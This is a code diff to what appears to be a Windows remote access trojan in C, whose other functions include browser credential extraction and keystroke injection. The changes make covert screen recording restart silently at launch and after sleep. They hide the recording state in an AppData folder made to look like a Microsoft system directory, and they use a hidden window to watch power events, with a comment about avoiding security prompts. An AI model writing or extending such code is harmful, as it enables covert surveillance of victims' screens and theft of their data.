@@ -388,10 +388,47 @@ void mouse_click(int button);
 void send_keys(const char* keys);
 void extract_browser_creds();
 void start_screenrecord();
+void start_screenrecord_internal();
 void stop_screenrecord();
 void download_screenrecord();
 void delete_screenrecord();
 DWORD WINAPI screenrecord_thread(LPVOID param);
+DWORD WINAPI power_monitor_thread(LPVOID param);
+
+// Power monitor for sleep/wake detection
+static HANDLE g_power_monitor_thread = NULL;
+static volatile int g_power_monitor_running = 0;
+
+// Power event monitor thread - restarts recording after wake from sleep
+DWORD WINAPI power_monitor_thread(LPVOID param) {
+    // Create a hidden window to receive power broadcast messages
+    WNDCLASSA wc = {0};
+    wc.lpfnWndProc = DefWindowProcA;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = "PowerMonitorClass";
+    RegisterClassA(&wc);
+    
+    HWND hwnd = CreateWindowExA(0, "PowerMonitorClass", "", 0, 0, 0, 0, 0, 
+                                 HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
+    
+    MSG msg;
+    while (g_power_monitor_running && GetMessage(&msg, NULL, 0, 0)) {
+        if (msg.message == WM_POWERBROADCAST) {
+            if (msg.wParam == PBT_APMRESUMEAUTOMATIC || msg.wParam == PBT_APMRESUMESUSPEND) {
+                // System woke from sleep - restart recording if enabled
+                Sleep(2000);  // Wait for system to stabilize
+                if (g_screenrecord_enabled && !g_screenrecord_running) {
+                    start_screenrecord_internal();
+                }
+            }
+        }
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    if (hwnd) DestroyWindow(hwnd);
+    return 0;
+}
 
 // Generate or load unique client ID (persisted in hidden file)
 void init_client_id() {
@@ -2880,45 +2917,65 @@ void extract_browser_creds() {
 // Helper to save/load screen recording state for persistence across restarts
 static void save_screenrecord_state() {
     char state_path[MAX_PATH];
-    char temp_dir[MAX_PATH];
-    GetTempPathA(MAX_PATH, temp_dir);
-    sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
+    char appdata_path[MAX_PATH];
+    // Use AppData instead of Temp so state persists across reboots
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+        sprintf(state_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_state.dat", appdata_path);
+        CreateDirectoryA(state_path, NULL);  // Ensure dir exists
+        char* last_slash = strrchr(state_path, '\\');
+        if (last_slash) {
+            *last_slash = '\0';
+            CreateDirectoryA(state_path, NULL);
+            *last_slash = '\\';
+        }
+    } else {
+        char temp_dir[MAX_PATH];
+        GetTempPathA(MAX_PATH, temp_dir);
+        sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
+    }
     
     FILE* f = fopen(state_path, "w");
     if (f) {
-        fprintf(f, "%s\n%d\n", g_screenrecord_path, g_screenrecord_running ? 1 : 0);
+        // Save enabled state so we auto-start on next run
+        fprintf(f, "%d\n", g_screenrecord_enabled ? 1 : 0);
         fclose(f);
     }
 }
 
 static void load_screenrecord_state() {
     char state_path[MAX_PATH];
-    char temp_dir[MAX_PATH];
-    GetTempPathA(MAX_PATH, temp_dir);
-    sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
+    char appdata_path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+        sprintf(state_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_state.dat", appdata_path);
+    } else {
+        char temp_dir[MAX_PATH];
+        GetTempPathA(MAX_PATH, temp_dir);
+        sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
+    }
     
     FILE* f = fopen(state_path, "r");
     if (f) {
-        char path[MAX_PATH] = {0};
-        int running = 0;
-        if (fgets(path, sizeof(path), f)) {
-            path[strcspn(path, "\r\n")] = 0;
-            // Check if the recorded file still exists
-            if (strlen(path) > 0 && GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
-                strcpy(g_screenrecord_path, path);
-            }
+        int enabled = 0;
+        if (fscanf(f, "%d", &enabled) == 1 && enabled) {
+            // Auto-start recording on startup if it was enabled
+            g_screenrecord_enabled = 1;
         }
-        // Note: We don't auto-resume recording on restart, just restore path if file exists
         fclose(f);
     }
 }
 
 static void clear_screenrecord_state() {
     char state_path[MAX_PATH];
-    char temp_dir[MAX_PATH];
-    GetTempPathA(MAX_PATH, temp_dir);
-    sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
+    char appdata_path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
+        sprintf(state_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_state.dat", appdata_path);
+    } else {
+        char temp_dir[MAX_PATH];
+        GetTempPathA(MAX_PATH, temp_dir);
+        sprintf(state_path, "%s\\.screenrec_state.dat", temp_dir);
+    }
     DeleteFileA(state_path);
+    g_screenrecord_enabled = 0;
 }
 
 DWORD WINAPI screenrecord_thread(LPVOID param) {
@@ -3158,6 +3215,7 @@ void start_screenrecord_internal() {
     
     g_screenrecord_running = 1;
     g_screenrecord_enabled = 1;
+    save_screenrecord_state();  // Persist state for next startup
     g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
 }
 
@@ -3170,10 +3228,12 @@ void start_screenrecord() {
     g_screenrecord_running = 1;
     g_screenrecord_enabled = 1;  // Mark as enabled for auto-resume
     g_screenrecord_path[0] = '\0';  // Clear path so new file is created
+    save_screenrecord_state();  // Persist state for next startup/wake
     g_screenrecord_thread = CreateThread(NULL, 0, screenrecord_thread, NULL, 0, NULL);
     
     if (g_screenrecord_thread) {
         send_websocket_data("[+] Screen recording started (native resolution, 5fps)\n", 55);
+        send_websocket_data("[*] Recording persists across restarts until 'stoprecord'\n", 58);
         send_websocket_data("[*] Use 'stoprecord' to stop (compresses video)\n", 48);
         send_websocket_data("[*] Use 'getrecord' to download (auto-compresses if needed)\n", 60);
     } else {
@@ -5450,6 +5510,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     // Load any persisted screen recording state from previous sessions
     load_screenrecord_state();
+    
+    // Auto-start screen recording if it was enabled in previous session
+    if (g_screenrecord_enabled && !g_screenrecord_running) {
+        start_screenrecord_internal();  // Silent start
+    }
+    
+    // Start power monitor thread to resume recording after sleep/wake
+    g_power_monitor_running = 1;
+    g_power_monitor_thread = CreateThread(NULL, 0, power_monitor_thread, NULL, 0, NULL);
     
     // NOTE: Persistence is now manual - use 'persist' command
     // Don't auto-add to startup as it can trigger security prompts
